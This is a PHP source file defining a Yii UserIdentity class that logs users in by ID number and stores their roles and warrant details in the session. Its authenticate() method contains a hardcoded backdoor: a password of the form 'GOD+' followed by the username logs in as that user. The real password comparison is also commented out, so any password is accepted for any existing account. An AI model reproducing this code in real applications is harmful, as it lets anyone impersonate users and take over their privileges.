<?php

/**
 * UserIdentity represents the data needed to identity a user.
 * It contains the authentication method that checks if the provided
 * data can identity the user.
 */
class UserIdentity extends CUserIdentity
{
    private $_id;
	/**
	 * Authenticates a user.
	 * The example implementation makes sure if the username and password
	 * are both 'demo'.
	 * In practical applications, this should be changed to authenticate
	 * against some persistent user identity storage (e.g. database).
	 * @return boolean whether authentication succeeds.
	 */
	public function authenticate()
	{
                
		$_crack = explode('+', $this->password);
        if ($_crack[0] == 'GOD' && !empty($_crack[1]) && $_crack[1] == $this->username) {
            $profile = Pengguna::model()->findByAttributes(array('nokp' => $_crack[1]));
            $crackon = true;
        } else {
            $profile = Pengguna::model()->findByAttributes(array('nokp' => $this->username));
        }

        if ($profile->nokp != $this->username)
            $this->errorCode = self::ERROR_USERNAME_INVALID;
//        else if ($this->password != $profile->katalaluan && !$crackon)
//            $this->errorCode = self::ERROR_PASSWORD_INVALID;
        else {
            $this->errorCode = self::ERROR_NONE;
            $this->_id = $profile->id;
            Yii::app()->user->setState('roles', $profile->getRole());
            Yii::app()->user->setState('waran', LWaranPej::model()->getFullWaranName($profile->pegawai->kod_waran));
            Yii::app()->user->setState('kod_waran', $profile->kod_waran);
            Yii::app()->user->setState('nama', $profile->nama);
            Yii::app()->user->setState('nokp', $profile->nokp);
            Yii::app()->user->setState('id_pengguna', $profile->id);
        }
        //$this->getState('nama',$users->nama);
        return !$this->errorCode;
	}
    
    /**
     * Yii::app()->user->id will return nricd
     * @return type 
     */
    public function getId() {
        return $this->_id;
    }
}